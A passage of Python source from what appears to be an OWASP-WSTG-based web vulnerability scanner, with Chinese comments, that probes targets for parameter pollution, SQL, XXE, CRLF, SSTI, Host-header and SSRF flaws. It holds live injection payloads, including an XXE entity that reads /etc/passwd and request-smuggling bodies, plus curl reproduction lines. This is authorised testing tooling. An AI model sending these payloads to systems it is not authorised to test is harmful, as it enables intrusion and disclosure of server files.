            technical_detail=(f"基准：GET {url} → HTTP {base_status}\n"
                              f"篡改：{m} {url} → HTTP {st}，正文 {bl} 字节"),
            impact="可绕过针对特定 HTTP 方法配置的访问控制，直接访问受保护资源。",
            reproduction=f"curl -s -X {m} {url} | head -20",
            remediation=("访问控制在应用层对「路径 + 身份」做校验，不按 HTTP 方法分别配置；"
                         "网关处只放行必要的方法，其余一律拒绝。"),
            compliance="等保2.0 安全计算环境-访问控制 / CWE-650",
            evidence=[finding_evidence("response", f"{m} {url} → HTTP {st}",
                                       "方法篡改结果")],
            grading_basis="实测换方法绕过访问控制并返回内容，定高危",
        ))

    note = (f"以 /{base}（HTTP {base_status}）为对照，测试 7 种方法，绕过成功 {len(hits)} 种")
    return found(note, findings, probes=probes, evidence_kind="方法变体实测")


# ======================================================================
# WSTG-INPV-04 HTTP 参数污染
# ======================================================================
@make_auto("WSTG-INPV-04", name="HTTP 参数污染检测", tool="内置检测器",
           risk=RISK_STANDARD, evidence_kind="重复参数实测",
           detector_ref="checks/injection.py:inpv04")
def inpv04(ctx: DetectorContext):
    params = extract_params(ctx)
    if not params:
        return no_target_outcome(ctx, "带参数的接口端点", probes=2, evidence_kind="无候选参数")

    probes = 0
    findings = []
    for p in params[:6]:
        url, pname = p["url"], p["param"]
        if not url.startswith("http") or ctx.domain not in url:
            continue
        parsed = urlparse(url)
        qs = parse_qs(parsed.query, keep_blank_values=True)
        base_pr = ctx.get(url)
        base_body = getattr(base_pr, "body_snippet", "") or ""
        base_status = getattr(base_pr, "status", 0)

        # 同一个参数出现两次，观察服务端取第一个还是第二个
        for sep_url, desc in (
            (parsed._replace(query=urlencode(qs, doseq=True) + f"&{pname}={MARK}").geturl(),
             "追加重复参数（取后者）"),
            (parsed._replace(query=f"{pname}={MARK}&" + urlencode(qs, doseq=True)).geturl(),
             "前置重复参数（取前者）"),
        ):
            probes += 1
            try:
                pr = ctx.get(sep_url)
            except Exception:  # noqa: BLE001
                continue
            body = getattr(pr, "body_snippet", "") or ""
            if MARK in body and MARK not in base_body:
                findings.append(make_finding(
                    "WSTG-INPV-04", f"HTTP 参数污染：{desc}（参数 {pname}）",
                    ctx.target_name, endpoint=url, method="GET", param=pname,
                    severity="中危", confidence="Medium", evidence_level="B",
                    description=(f"当同一个参数 `{pname}` 在请求中出现两次时，"
                                 f"服务端采用了其中一个值（{desc}）。"
                                 "这说明参数解析行为特定，且前后端、网关之间可能不一致。"),
                    technical_detail=(f"基准请求：GET {url} → HTTP {base_status}\n"
                                      f"污染请求：{sep_url}\n"
                                      "服务端采纳了注入的值（标记出现在响应中）。"),
                    impact=("前后端对重复参数的取值不一致时，可绕过参数校验："
                            "前端校验第一个值，后端使用第二个值。"
                            "常用于绕过 WAF 规则、绕过金额 / 权限参数校验。"),
                    reproduction=f"curl -s '{sep_url}' | grep -o '{MARK}'",
                    remediation=("服务端统一参数解析策略：遇到重复参数直接拒绝请求（返回 400）；"
                         "网关与应用使用同一套解析规则；"
                         "对关键参数（金额、ID、角色）做重复性检查。"),
                    compliance="等保2.0 安全计算环境-入侵防范 / CWE-235",
                    evidence=[finding_evidence("response", body[:800], f"参数污染 {pname}")],
                    grading_basis="实测重复参数被采纳，可用于绕过上游校验，按 B 级定中危",
                ))
                break
        if findings:
            break

    note = f"对 {len(params[:6])} 个参数测试重复参数行为 {probes} 次，命中 {len(findings)} 处"
    return found(note, findings, probes=probes, evidence_kind="重复参数实测")


# ======================================================================
# WSTG-INPV-05 SQL 注入
# ======================================================================
@make_auto("WSTG-INPV-05", name="SQL 注入检测（报错型 + sqlmap 多手法验证）",
           tool="内置检测器 + sqlmap",
           risk=RISK_STANDARD, evidence_kind="报错特征实测 + sqlmap 多手法验证",
           detector_ref="checks/injection.py:inpv05")
def inpv05(ctx: DetectorContext):
    """SQL 注入检测：两层手法，缺一不可。

    第一层（内置、任何档位都跑）：报错型 —— 快、零依赖、命中即确证。
    第二层（sqlmap、标准档以上、安全档不跑）：布尔盲注 / 时间盲注 / UNION。
    第二层才是这一项的**覆盖率来源** —— 只做第一层等于只覆盖了「报错被回显」
    这一小类，而清单声明的检测对象是「SQL 注入」。
    """
    out = _error_based(ctx, "sql", "SQL 注入", "WSTG-INPV-05", "高危", max_params=8)
    suffix, extra = _sqlmap_supplement(ctx, already_hit=bool(out.findings))
    out.note = (out.note + suffix).strip("；")
    if extra is not None:
        out.findings.append(extra)
    out.evidence_kind = "报错型实测 + sqlmap 多手法验证"
    return out


# ======================================================================
# WSTG-INPV-06 LDAP 注入
# ======================================================================
@make_auto("WSTG-INPV-06", name="LDAP 注入检测", tool="内置检测器",
           risk=RISK_STANDARD, evidence_kind="报错特征实测",
           detector_ref="checks/injection.py:inpv06")
def inpv06(ctx):
    return _error_based(ctx, "ldap", "LDAP 注入", "WSTG-INPV-06", "高危")


# ======================================================================
# WSTG-INPV-07 XML 注入（XXE）
# ======================================================================
@make_auto("WSTG-INPV-07", name="XML 外部实体（XXE）检测", tool="内置检测器",
           risk=RISK_STANDARD, evidence_kind="XML 端点实测",
           detector_ref="checks/injection.py:inpv07")
def inpv07(ctx: DetectorContext):
    """XXE 检测：先定位 XML / 文件上传端点，再真实提交含外部实体的 XML 验证。

    红线 1：本项过去只「发现 XML 端点」就判通过，是假通过 —— 发现端点 ≠
    证明解析器未禁用外部实体。改为：能真验证（响应体回显被读出的文件内容）
    才判不通过；其余一律诚实判待确认，绝不把「没测出来」写成「没问题」。
    """
    blobs = "\n".join(list(ctx.js_result.get("bodies") or []) + [ctx.baseline_body])
    xml_endpoints = set()
    for m in re.finditer(r"[\"']((?:https?://[^\"']*|/[^\"']*)"
                         r"(?:xml|soap|wsdl|rss|atom|import|upload)[^\"']*)[\"']", blobs, re.I):
        xml_endpoints.add(m.group(1))
    # 整站同码时，405 / 415 不构成「XML 端点存在」的证据。
    _modal, _ratio, _n = sitewide_guard(ctx)
    for pre in ("api/xml", "xmlrpc.php", "soap", "ws", "services", "rss", "feed"):
        pr = probe_or_none(ctx, pre)
        if pr is None:
            continue
        _st = getattr(pr, "status", 0)
        if _modal and _st == _modal:
            continue
        if _st in (200, 405, 415):
            xml_endpoints.add(urljoin(ctx.target_url, pre))

    accept_xml = False
    try:
        import requests
        r = requests.options(ctx.target_url, timeout=ctx._client.timeout, verify=False,
                             headers=dict(ctx._client.session.headers))
        if re.search(r"xml", r.headers.get("Allow", "") + r.headers.get("Accept", ""), re.I):
            accept_xml = True
    except Exception:  # noqa: BLE001
        pass

    # 文件上传入口（XXE 在 Juice Shop 等靶场里就藏在投诉文件上传后面）：
    # 从 JS 产物 + 已知清单合并，专挖 multipart 上传点。
    upload_candidates = {u for u in xml_endpoints if "upload" in u.lower()}
    for u in (urljoin(ctx.target_url, p) for p in
              ("file-upload", "upload", "api/upload", "import", "xmlrpc")):
        upload_candidates.add(u)

    if not xml_endpoints and not accept_xml and not upload_candidates:
        return no_target_outcome(ctx, "接受 XML / 文件上传的端点",
                                 probes=len(xml_endpoints) + 2, evidence_kind="XML 端点探测")

    # ---- 阶段二：真实提交 XXE 载荷验证（受控写，需 deep + 台账双锁） ----
    if not ctx.risk_allowed(RISK_DEEP):
        return pending(
            f"当前档位（{ctx.profile_name}）不允许提交文件，XXE 未实测验证；"
            "发现 XML / 上传入口若干但仅做了被动发现，未证明解析器是否解析外部实体。"
            "补齐方式：以 deep 档重扫。",
            probes=len(xml_endpoints) + 2, evidence_kind="XML 端点探测")
    if not ctx.allow_write:
        return pending(
            "授权台账未对 localhost 显式授权写操作，XXE 需提交特制 XML 文件，"
            "本次未执行（补齐：ledger 对该目标置 allow_write_test: true，红线 24）。",
            probes=len(xml_endpoints) + 2, evidence_kind="XML 端点探测")

    # 文件内容回显判据（与靶场 matchesEtcPasswdFile / matchesSystemIniFile 对齐）：
    # 解析器把外部实体展开后回显到错误响应体，才构成 XXE 确证。
    LEAK_PATTERNS = (
        re.compile(r"\broot:\w*:0:0:"),                 # /etc/passwd 首行
        re.compile(r"; for 16-bit app support", re.I),   # C:\Windows\win.ini
        re.compile(r"\w*:\w*:\d{1,4}:\d{1,4}:\w*:.*"),  # 通用 passwd 行
    )

    xxe_payload = (
        '<?xml version="1.0" encoding="UTF-8"?>\r\n'
        '<!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>\r\n'
        '<r>&xxe;</r>\r\n'
    )
    probes = 0
    tried: list[str] = []
    for url in list(upload_candidates)[:3]:
        probes += 1
        try:
            import requests
            resp = requests.post(
                url,
                files={"file": ("aiscan_xxe_probe.xml", xxe_payload, "application/xml")},
                timeout=ctx._client.timeout, verify=False, allow_redirects=False,
                headers=dict(ctx._client.session.headers),
            )
            ctx.probe_count += 1
            ctx.submissions.append({
                "url": url, "kind": "XXE 上传探针",
                "status": resp.status_code, "fields": ["file(aiscan_xxe_probe.xml)"],
            })
        except Exception as e:  # noqa: BLE001
            tried.append(f"{url} → 请求异常：{type(e).__name__}")
            continue
        body = resp.text or ""
        hit = next((p for p in LEAK_PATTERNS if p.search(body)), None)
        if hit is not None and resp.status_code not in (404, 405, 403, 401):
            return found(
                f"向 {url} 提交含外部实体（file:///etc/passwd）的 XML 后，"
                f"响应体（HTTP {resp.status_code}）回显出被读出的文件内容，"
                "证明服务端 XML 解析器未禁用外部实体 —— XXE 确证。",
                [make_finding(
                    "WSTG-INPV-07", "XML 外部实体注入（XXE）可读服务端文件",
                    ctx.target_name, endpoint=url, method="POST", param="file",
                    severity="高危", confidence="High", evidence_level="A",
                    description=("目标在解析上传的 XML 时展开了外部实体并回显其内容，"
                                 "攻击者可借此读取服务端本地文件（如 /etc/passwd）"
                                 "或发起服务端请求。"),
                    technical_detail=(
                        f"受影响端点：{url}（multipart 字段 file）\n"
                        f"提交载荷：<!ENTITY xxe SYSTEM \"file:///etc/passwd\">\n"
                        f"响应：HTTP {resp.status_code}，错误体含被展开的文件内容"
                        f"（命中特征：{hit.pattern}）"),
                    impact=("直接导致服务端任意文件读取；若解析器还支持 URL 实体，"
                            "可进一步演变为 SSRF / 内网探测。"),
                    reproduction=(
                        f"curl -F 'file=@xxe.xml' {url}   # xxe.xml 含上述外部实体"),
                    remediation=("禁用 DTD / 外部实体（如 libxmljs2 用 noent:false、"
                                "或 DOMParser 关 resolveEntity）；上传文件白名单到类型与大小；"
                                "对解析结果做最小回显。"),
                    compliance="等保2.0 安全计算环境-数据完整性 / CWE-611",
                    evidence=[finding_evidence(
                        "response_body", body[:400].replace("\n", " "),
                        "XXE 响应体（含被读出的文件内容）")],
                    grading_basis="实测提交外部实体后被读取文件内容回显，定高危",
                )],
                probes=probes, evidence_kind="XXE 实测",
            )
        tried.append(f"{url} → HTTP {resp.status_code} 未观测到文件内容回显")

    return pending(
        "已向最多 3 个上传入口提交 XXE 载荷并受控验证，未观测到文件内容回显"
        f"（尝试：{'；'.join(tried) or '无'}）。未确认 XXE：可能该端点启用了外部实体"
        "禁用、或文件上传解析链路未对匿名开放。这不是「未发现 XXE」，是「没测出来」"
        "—— 需在确认靶场开启对应解析挑战后复测。",
        probes=probes, evidence_kind="XXE 实测")


# ======================================================================
# WSTG-INPV-08 SSI 注入
# ======================================================================
@make_auto("WSTG-INPV-08", name="SSI 注入检测", tool="内置检测器",
           risk=RISK_STANDARD, evidence_kind="SSI 指令实测",
           detector_ref="checks/injection.py:inpv08")
def inpv08(ctx):
    return _error_based(ctx, "ssi", "SSI 注入", "WSTG-INPV-08", "高危", max_params=5)


# ======================================================================
# WSTG-INPV-09 XPath 注入
# ======================================================================
@make_auto("WSTG-INPV-09", name="XPath 注入检测", tool="内置检测器",
           risk=RISK_STANDARD, evidence_kind="报错特征实测",
           detector_ref="checks/injection.py:inpv09")
def inpv09(ctx):
    return _error_based(ctx, "xpath", "XPath 注入", "WSTG-INPV-09", "高危", max_params=5)


# ======================================================================
# WSTG-INPV-10 IMAP / SMTP 注入
# ======================================================================
@make_auto("WSTG-INPV-10", name="邮件协议注入检测", tool="内置检测器",
           risk=RISK_STANDARD, evidence_kind="邮件参数实测",
           detector_ref="checks/injection.py:inpv10")
def inpv10(ctx):
    params = extract_params(ctx)
    mail_params = [p for p in params
                   if re.search(r"(mail|email|to|subject|from|sender|contact|invite|share)",
                                p.get("param", ""), re.I)]
    if not mail_params:
        forms = find_forms(ctx)
        mail_params = [{"url": f["action"] or f["page"], "param": i}
                       for f in forms for i in f["inputs"]
                       if re.search(r"(mail|email|to|subject)", i, re.I)]
    if not mail_params:
        return no_target_outcome(ctx, "邮件 / 短信类收件人参数", probes=2, evidence_kind="邮件参数探测")
    out = _error_based(ctx, "imap", "邮件协议注入", "WSTG-INPV-10", "中危", max_params=5)
    out.note = f"邮件类参数 {len(mail_params)} 个；" + out.note
    return out


# ======================================================================
# WSTG-INPV-11 代码注入
# ======================================================================
@make_auto("WSTG-INPV-11", name="代码注入检测", tool="内置检测器",
           risk=RISK_STANDARD, evidence_kind="报错特征实测",
           detector_ref="checks/injection.py:inpv11")
def inpv11(ctx):
    return _error_based(ctx, "code", "代码注入", "WSTG-INPV-11", "高危", max_params=8)


# ======================================================================
# WSTG-INPV-12 命令注入
# ======================================================================
@make_auto("WSTG-INPV-12", name="命令注入检测", tool="内置检测器",
           risk=RISK_STANDARD, evidence_kind="报错特征实测",
           detector_ref="checks/injection.py:inpv12")
def inpv12(ctx):
    out = _error_based(ctx, "command", "命令注入", "WSTG-INPV-12", "严重", max_params=8)
    out.note += "；命令注入的时间盲注分支需更具侵入性的探测，本次未执行（避免触发风控与影响生产）"
    return out


# ======================================================================
# WSTG-INPV-13 格式字符串注入
# ======================================================================
@make_auto("WSTG-INPV-13", name="格式字符串注入检测", tool="内置检测器",
           risk=RISK_STANDARD, evidence_kind="格式串实测",
           detector_ref="checks/injection.py:inpv13")
def inpv13(ctx):
    return _error_based(ctx, "format", "格式字符串注入", "WSTG-INPV-13", "中危", max_params=5)


# ======================================================================
# WSTG-INPV-14 孵化漏洞
# ======================================================================
@make_manual(
    "WSTG-INPV-14", name="孵化漏洞（文件上传链）测试",
    procedure=("1) 枚举全部上传入口：头像、附件、导入、批量导入、图片粘贴、"
               "打包上传、第三方回传；\n"
               "2) 对每个入口记录：允许的扩展名、大小上限、是否校验 MIME、"
               "是否校验文件头、上传后的访问地址；\n"
               "3) 逐个尝试绕过（在测试环境进行，每步只验证一个点）：\n"
               "   - 双扩展名（.jpg.php）、大小写（.PHP）、特殊后缀（.php5/.phtml/.jspx）\n"
               "   - MIME 伪造（Content-Type 改为 image/jpeg）\n"
               "   - 文件头伪造（GIF89a + 脚本内容）\n"
               "   - 路径穿越文件名（../../shell.php）\n"
               "   - 压缩包穿越（zip 内文件名含 ../）\n"
               "4) 确认上传后能否直接访问执行：访问上传文件地址，"
               "若返回脚本执行结果即为「孵化」成功；\n"
               "5) 检查上传目录是否与 Web 目录同源、是否禁止脚本执行。"),
    expect="上传校验在服务端做白名单（扩展名 + 真实文件头 + 尺寸）；"
           "上传目录不解析脚本；文件以随机名保存并置于 Web 根之外或独立域名。",
    why_manual="必须真实上传文件并访问执行，属写入操作；且验证过程易把测试文件留在生产环境。",
    requires=["write"], risk=RISK_DEEP, tool="人工核查",
)
def _inpv14(ctx: DetectorContext):  # pragma: no cover
    return ok("")


# ======================================================================
# WSTG-INPV-15 HTTP 响应拆分（CRLF 注入）
# ======================================================================
@make_auto("WSTG-INPV-15", name="CRLF 响应拆分注入检测", tool="内置检测器",
           risk=RISK_STANDARD, evidence_kind="响应头实测",
           detector_ref="checks/injection.py:inpv15")
def inpv15(ctx: DetectorContext):
    params = extract_params(ctx)
    if not params:
        return no_target_outcome(ctx, "带参数的接口端点", probes=2, evidence_kind="无候选参数")

    # 注意：这里不能用 "%0d%0a...%s" % MARK 这种写法 ——
    # %0d / %0a 会被 Python 当成整数格式化符，直接抛 TypeError。
    # 载荷里的百分号属于 HTTP 编码，与字符串格式化无关，一律用拼接。
    payloads = [
        "%0d%0aAiscan-Injected: " + MARK,
        "%0aAiscan-Injected: " + MARK,
        "%23%0d%0aAiscan-Injected: " + MARK,
        "\r\nAiscan-Injected: " + MARK,
    ]
    probes = 0
    findings = []
    for p in params[:6]:
        url, pname = p["url"], p["param"]
        if not url.startswith("http") or ctx.domain not in url:
            continue
        for pl in payloads:
            probes += 1
            r = _inject(ctx, url, pname, pl)
            if r is None:
                continue
            probe, test_url = r
            headers = {k.lower(): v for k, v in (getattr(probe, "headers", {}) or {}).items()}
            injected = [k for k in headers if k.startswith("aiscan-injected")]
            if injected:
                findings.append(make_finding(
                    "WSTG-INPV-15", f"CRLF 注入可插入响应头（参数 {pname}）",
                    ctx.target_name, endpoint=url, method="GET", param=pname,
                    severity="中危", confidence="High", evidence_level="A",
                    description=("参数值中的回车换行符没有被过滤，被拼进了响应头，"
                                 "导致注入了一个新的响应头。"),
                    technical_detail=(f"受影响参数：{pname}\n"
                                      f"注入的响应头：{injected[0]}\n"
                                      f"响应头片段：{ {k: v for k, v in headers.items() if 'aiscan' in k} }"),
                    impact=("可注入任意响应头，用于插入伪造 Cookie（会话固定）、"
                            "或构造出额外的响应体实现缓存投毒 / XSS。"
                            "若与缓存配合，可影响所有访问该地址的用户。"),
                    reproduction=f"curl -si '{test_url}' | grep -i 'aiscan-injected'",
                    remediation="对进入响应头的用户输入做严格白名单过滤，剔除 \\r \\n 及其编码形态（%0d %0a）。",
                    compliance="等保2.0 安全计算环境-入侵防范 / CWE-113",
                    evidence=[finding_evidence("header", str(headers)[:800], "注入的响应头")],
                    grading_basis="实测响应头被注入，定中危",
                ))
                break
        if findings:
            break

    note = f"对 {len(params[:6])} 个参数测试 {probes} 个 CRLF 载荷，命中 {len(findings)} 处"
    return found(note, findings, probes=probes, evidence_kind="响应头注入实测")


# ======================================================================
# WSTG-INPV-16 HTTP 请求走私
# ======================================================================
@make_auto("WSTG-INPV-16", name="HTTP 请求走私探测（时序判定）", tool="内置检测器",
           risk=RISK_STANDARD, evidence_kind="时序对比实测",
           detector_ref="checks/injection.py:inpv16")
def inpv16(ctx: DetectorContext):
    """只发 2 个探测请求，用时序差异做初判。

    请求走私的完整验证需要构造特定的畸形报文并观察二次响应，
    在共享网关的目标上可能影响其他用户，因此本项只做低风险初判，
    确认疑点后按人工指引在测试环境复现。
    """
    import requests

    def timed(method: str, headers: dict[str, str], body: str = "") -> float:
        try:
            ctx._client._throttle()
            t0 = time.time()
            requests.request(method, ctx.target_url, headers=headers, data=body or None,
                             timeout=max(ctx._client.timeout, 10), verify=False,
                             allow_redirects=False)
            return time.time() - t0
        except Exception:  # noqa: BLE001
            return -1.0

    base_headers = dict(ctx._client.session.headers)
    normal = [timed("GET", base_headers) for _ in range(2)]
    normal = [t for t in normal if t > 0]
    if not normal:
        return ok("基准请求未能完成，跳过请求走私探测", probes=2, evidence_kind="时序探测")

    avg = sum(normal) / len(normal)
    sm = dict(base_headers)
    sm.update({"Content-Length": "4", "Transfer-Encoding": "chunked",
               "Content-Type": "application/x-www-form-urlencoded"})
    t_cl_te = timed("POST", sm, "1\r\nX\r\n0\r\n\r\n")

    sm2 = dict(base_headers)
    sm2.update({"Transfer-Encoding": "chunked", "Content-Length": "6",
                "Content-Type": "application/x-www-form-urlencoded"})
    t_te_cl = timed("POST", sm2, "0\r\n\r\nX")

    probes = len(normal) + 2
    findings = []
    slow = [t for t in (t_cl_te, t_te_cl) if t > 0 and t > avg * 3 and t - avg > 3]

    if slow:
        findings.append(make_finding(
            "WSTG-INPV-16", "请求走私探测出现异常时序（疑似 CL.TE / TE.CL 处置不一致）",
            ctx.target_name, endpoint=ctx.target_url, method="POST",
            severity="中危", confidence="Low", evidence_level="C",
            description=("构造同时带 Content-Length 与 Transfer-Encoding 的请求时，"
                         "服务端响应时间明显长于正常请求（慢了 3 倍以上）。"
                         "这通常出现在前后端对请求边界的解析不一致时。"),
            technical_detail=(f"正常请求平均耗时：{avg:.2f}s\n"
                              f"CL.TE 探测耗时：{t_cl_te:.2f}s\n"
                              f"TE.CL 探测耗时：{t_te_cl:.2f}s\n"
                              "说明：时序差异仅为疑点，不能作为确证。"),
            impact=("若确实存在走私，攻击者可在共享连接上把一个请求的响应「挪用」给下一个用户，"
                    "造成凭据泄露或缓存投毒。危害范围取决于网关的连接复用方式。"),
            reproduction=("在测试环境构造同时带 Content-Length 与 Transfer-Encoding 的请求，"
                          "连续发送两次并观察第二次是否收到第一个请求的响应。"),
            remediation=("① 网关统一处理并规范化请求边界（拒绝含冲突头的请求）；"
                         "② 拒绝 Transfer-Encoding: chunked 之外的变体（如 chunked 大小写变体、"
                         "Transfer-Encoding: xchunked）；"
                         "③ 前后端使用同一 HTTP 解析实现（如统一启用 HTTP/2，"
                         "或前端拒绝畸形报文）。"),
            compliance="等保2.0 安全计算环境-入侵防范 / CWE-444",
            evidence=[finding_evidence("request",
                                       f"avg={avg:.2f}s cl_te={t_cl_te:.2f}s te_cl={t_te_cl:.2f}s",
                                       "时序探测")],
            grading_basis="仅时序异常，证据级别 C，不作为漏洞定级，列入待确认",
        ))

    note = (f"基线 {avg:.2f}s，CL.TE {t_cl_te:.2f}s，TE.CL {t_te_cl:.2f}s；"
            + ("时序异常，已列入待确认" if slow else "未见异常时序差异"))
    return found(note, findings, probes=probes, evidence_kind="时序对比实测")


# ======================================================================
# WSTG-INPV-17 Host 头注入
# ======================================================================
@make_auto("WSTG-INPV-17", name="Host 头注入检测", tool="内置检测器",
           risk=RISK_STANDARD, evidence_kind="Host 头实测",
           detector_ref="checks/injection.py:inpv17")
def inpv17(ctx: DetectorContext):
    import requests

    findings = []
    probes = 0
    evil = "aiscan-probe.invalid"
    markers = [evil, "127.0.0.1", "localhost"]

    for host_val in markers:
        probes += 1
        try:
            ctx._client._throttle()
            r = requests.get(ctx.target_url, timeout=ctx._client.timeout, verify=False,
                             allow_redirects=False,
                             headers={**dict(ctx._client.session.headers),
                                      "Host": host_val})
        except Exception:  # noqa: BLE001
            continue
        body = r.text or ""
        loc = r.headers.get("Location", "")
        if evil in body or evil in loc:
            findings.append(make_finding(
                "WSTG-INPV-17", "Host 头被用于生成页面内容或跳转地址",
                ctx.target_name, endpoint=ctx.target_url, method="GET", param="Host",
                severity="中危", confidence="High", evidence_level="A",
                description=("修改请求的 Host 头后，服务端把这个值用在了响应内容或跳转地址里。"
                             "这类逻辑常见于「找回密码链接生成」「静态资源前缀」「站点域名展示」。"),
                technical_detail=(f"注入的 Host：{host_val}\n"
                                  + (f"Location 响应头：{loc}\n" if loc else "")
                                  + f"响应片段：{body[:400]}"),
                impact=("① 密码重置投毒：若重置链接用 Host 头拼接，攻击者可让重置链接指向自己的域名，"
                        "受害者点击后重置令牌即泄露，实现账号接管；"
                        "② 缓存投毒：污染缓存中该页面的绝对地址；"
                        "③ 配合邮件模板可发送带恶意域名的钓鱼邮件。"),
                reproduction=(f"curl -si -H 'Host: {evil}' {ctx.target_url} | head -30\n"
                              "# 重点观察重置密码邮件中的链接域名"),
                remediation=("① 不使用 Host 头拼接对外链接，改用配置中的固定站点域名；"
                             "② 服务端配置允许的 Host 白名单，非法 Host 直接拒绝（返回 400 / 444）；"
                             "③ 重视密码重置流程中的域名生成逻辑，这是最常被利用的场景。"),
                compliance="等保2.0 安全计算环境-入侵防范 / CWE-20",
                evidence=[finding_evidence("response", body[:800] + "\n" + loc, "Host 头注入响应")],
                grading_basis="实测 Host 头被用于生成输出，定中危",
            ))
            break

    note = f"测试 {len(markers)} 个非法 Host 值，命中 {len(findings)} 处"
    return found(note, findings, probes=probes, evidence_kind="Host 头实测")


# ======================================================================
# WSTG-INPV-18 服务端模板注入（SSTI）
# ======================================================================
@make_auto("WSTG-INPV-18", name="服务端模板注入（SSTI）检测", tool="内置检测器",
           risk=RISK_STANDARD, evidence_kind="表达式求值实测",
           detector_ref="checks/injection.py:inpv18")
def inpv18(ctx: DetectorContext):
    params = extract_params(ctx)
    if not params:
        return no_target_outcome(ctx, "带参数的接口端点", probes=2, evidence_kind="无候选参数")

    probes = 0
    findings = []
    for p in params[:8]:
        url, pname = p["url"], p["param"]
        if not url.startswith("http") or ctx.domain not in url:
            continue
        try:
            base_body = getattr(ctx.get(url), "body_snippet", "") or ""
        except Exception:  # noqa: BLE001
            continue
        for payload, expect in (("{{7*7}}", "49"), ("${7*7}", "49"),
                                ("#{7*7}", "49"), ("<%= 7*7 %>", "49"),
                                ("{{7*'7'}}", "7777777")):
            probes += 1
            r = _inject(ctx, url, pname, payload)
            if r is None:
                continue
            probe, test_url = r
            body = getattr(probe, "body_snippet", "") or ""
            # 必须出现「表达式被求值后的结果」，且原始表达式不在响应里原样出现才更强
            if expect in body and (payload not in body or expect not in base_body):
                findings.append(make_finding(
                    "WSTG-INPV-18", f"服务端模板注入（参数 {pname}）",
                    ctx.target_name, endpoint=url, method="GET", param=pname,
                    severity="严重", confidence="High", evidence_level="A",
                    description=(f"参数 `{pname}` 的值被当成模板表达式执行了："
                                 f"提交 {payload} 后，响应中出现了计算结果 {expect}。"
                                 "这说明用户输入进入了服务端模板引擎的求值流程。"),
                    technical_detail=(f"受影响参数：{pname}\n"
                                      f"提交载荷：{payload}\n"
                                      f"响应中出现的求值结果：{expect}\n"
                                      f"响应片段（已截断）：\n{body[:800]}"),
                    impact=("模板注入通常可以直接升级为远程命令执行："
                            "攻击者可读取服务端配置与环境变量（数据库口令、云凭据），"
                            "并进一步执行系统命令获得服务器控制权。"
                            "这是危害等级最高的一类漏洞。"),
                    reproduction=(f"原始请求：GET {url}\n"
                                  f"改为：{pname}={payload}\n"
                                  f"响应中出现 {expect} 即确认。"),
                    remediation=("① 不把用户输入作为模板内容渲染（用户数据只能作为变量传入，"
                                 "不能参与模板字符串拼接）；"
                                 "② 使用沙箱化模板引擎并关闭危险内置函数；"
                                 "③ 输入做白名单校验；"
                                 "④ 模板引擎版本保持最新（多数 SSTI RCE 依赖旧版本特性）。"),
                    compliance="等保2.0 安全计算环境-入侵防范 / CWE-1336",
                    evidence=[finding_evidence("response", body[:1500], "SSTI 求值结果")],
                    grading_basis="实测模板表达式被求值，可直接升级至 RCE，定严重",
                ))
                break
        if findings:
            break

    note = f"对 {len(params[:8])} 个参数测试 {probes} 个模板表达式，命中 {len(findings)} 处"
    return found(note, findings, probes=probes, evidence_kind="表达式求值实测")


# ======================================================================
# WSTG-INPV-19 服务端请求伪造（SSRF）
# ======================================================================
@make_auto("WSTG-INPV-19", name="SSRF 参数识别与初判", tool="内置检测器",
           risk=RISK_STANDARD, evidence_kind="URL 参数实测",
           detector_ref="checks/injection.py:inpv19")
def inpv19(ctx: DetectorContext):
    # 只用查询类参数（SSRF 探测以 GET 语义替换参数值）
    params = [p for p in extract_params(ctx) if p.get("method", "GET") == "GET"]
    KEYWORD = (r"(url|uri|link|src|source|target|dest|redirect|return|callback|next|"
               r"image|img|avatar|fetch|load|proxy|feed|webhook|host|domain|site|endpoint)")
    named = [p for p in params if re.search(KEYWORD, p.get("param", ""), re.I)]
    # 按参数名关键词挑对象，只能当「优先测」，绝不能当「只测这些」——
    # SSRF 参数完全可能叫 id / q / u / path / file，关键词表永远不全，
    # 每漏掉一个参数名，就多出一行安静的「通过」。
    others = [p for p in params if p not in named]
    degraded = not named and bool(others)
    cands = (named[:6] + others[:4]) if named else others[:6]

    hits = []
    probes = 0
    findings = []
    if cands:
        import requests
        for p in cands:
            url, pname = p["url"], p["param"]
            if not url.startswith("http") or ctx.domain not in url:
                continue
            parsed = urlparse(url)
            qs = parse_qs(parsed.query, keep_blank_values=True)
            qs[pname] = ["http://127.0.0.1:80/"]
            test_url = parsed._replace(query=urlencode(qs, doseq=True)).geturl()
            probes += 1
            try:
                ctx._client._throttle()
                t0 = time.time()
                r = requests.get(test_url, timeout=min(ctx._client.timeout, 10),
                                 verify=False, allow_redirects=False,
                                 headers=dict(ctx._client.session.headers))
                dt = time.time() - t0
            except Exception:  # noqa: BLE001
                continue
            body = r.text or ""
            # 初判信号：返回了本机服务的典型内容，或响应时间明显异常
            if re.search(r"(nginx|apache|iis|tomcat|Welcome to|It works|"
                         r"<html.*(localhost|127\.0\.0\.1))", body, re.I):
                hits.append((url, pname, r.status_code, body[:300], test_url))
            elif dt > 5 and r.status_code == 200:
                hits.append((url, pname, r.status_code, f"响应耗时 {dt:.1f}s（疑似内部请求）", test_url))

    if hits:
        url, pname, st, frag, test_url = hits[0]
        findings.append(make_finding(
            "WSTG-INPV-19", f"疑似 SSRF：URL 参数可直接驱动服务端发起请求（{pname}）",
            ctx.target_name, endpoint=url, method="GET", param=pname,
            severity="高危", confidence="Medium", evidence_level="B",
            description=(f"参数 `{pname}` 接受一个 URL，服务端会据此发起请求。"
                         "将其指向本机地址时，响应内容与耗时出现了异常，"
                         "说明请求确实由服务端代为发出。"),
            technical_detail=(f"受影响参数：{pname}\n"
                              f"测试地址：http://127.0.0.1:80/\n"
                              f"响应：HTTP {st}\n响应片段：{frag}"),
            impact=("SSRF 可用于：① 探测并访问内网服务（数据库、缓存、管理后台）；"
                    "② 读取云主机元数据服务获取临时凭据，直接接管云资源；"
                    "③ 以目标服务器身份发起攻击，绕过网络边界。"
                    "在云环境中这是从「一个外部接口」到「拿到云凭据」的常见路径。"),
            reproduction=(f"curl -s '{test_url}' | head -20\n"
                          "# 进一步可尝试指向云元数据地址，确认是否可取到凭据（需授权）"),
            remediation=("① 不把用户输入直接作为请求目标，改用服务端白名单映射（如 id → 固定地址）；"
                         "② 必须代理外部地址时：解析目标 IP 并校验不在内网段"
                         "（10/8、172.16/12、192.168/16、127/8、169.254/16、::1）；"
                         "③ 禁止跟随 30x 跳转（跳转可绕过首跳校验）；"
                         "④ 云主机启用 IMDSv2 并限制元数据访问；"
                         "⑤ 出网流量走统一代理并做目的地审计。"),
